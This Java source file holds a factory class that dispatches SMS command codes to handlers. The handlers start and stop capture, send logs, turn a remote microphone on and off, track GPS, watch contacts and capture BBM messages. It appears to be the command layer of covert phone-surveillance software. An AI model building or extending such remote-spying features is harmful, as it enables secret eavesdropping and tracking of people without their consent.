package com.vvt.rmtcmd;

import com.vvt.global.Global;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.rmtcmd.sms.*;

public final class CmdFactory {
	
	public static RmtCommand getCommand(RmtCmdLine rmtCmdLine) {
		int cmd = rmtCmdLine.getCode();
		RmtCommand command = null;
		SMSCommandCode smsCmdCode = Global.getSMSCmdStore().getSMSCommandCode();
		if (cmd == smsCmdCode.getStartCaptureCmd()) {
			command = new CmdStartCapture(rmtCmdLine);
		} else if (cmd == smsCmdCode.getStopCaptureCmd()) {
			command = new CmdStopCapture(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSendLogNowCmd()) {
			command = new CmdSendLogNow(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSendDiagnosticsCmd()) {
			command = new CmdDiagnostics(rmtCmdLine);
		} else if (cmd == smsCmdCode.getSIMCmd()) {
			if (rmtCmdLine.getEnabled() == 1) {
				command = new CmdStartSIM(rmtCmdLine);
			} else if (rmtCmdLine.getEnabled() == 0) {
				command = new CmdStopSIM(rmtCmdLine);
			}
		} else if (cmd == smsCmdCode.getStartMicCmd()) {
			command = new CmdStartMic(rmtCmdLine);
		} else if (cmd == smsCmdCode.getStopMicCmd()) {
			command = new CmdStopMic(rmtCmdLine);
		} else if (cmd == smsCmdCode.getGPSCmd()) {
			if (rmtCmdLine.getEnabled() == 1) {
				command = new CmdStartGPS(rmtCmdLine);
			} else if (rmtCmdLine.getEnabled() == 0) {
				command = new CmdStopGPS(rmtCmdLine);
			}
		} else if (cmd == smsCmdCode.getGPSOnDemandCmd()) {
			command = new CmdGPSOnDemand(rmtCmdLine);
		} else if (cmd == smsCmdCode.getWatchListCmd()) {
			if (rmtCmdLine.getEnabled() == 1) {
				command = new CmdEnableWatchList(rmtCmdLine);
			} else if (rmtCmdLine.getEnabled() == 0) {
				command = new CmdDisableWatchList(rmtCmdLine);
			}
		} else if (cmd == smsCmdCode.getBBMCmd()) {
			if (rmtCmdLine.getEnabled() == 1) {
				command = new CmdEnableBBM(rmtCmdLine);
			} else if (rmtCmdLine.getEnabled() == 0) {
				command = new CmdDisableBBM(rmtCmdLine);
			}
		} else if (cmd == smsCmdCode.getActivationCmd()) {
			command = new CmdActivation(rmtCmdLine);
		} else if (cmd == smsCmdCode.getDeactivationCmd()) {
			command = new CmdDeactivation(rmtCmdLine);
		}
		return command;
	}
}
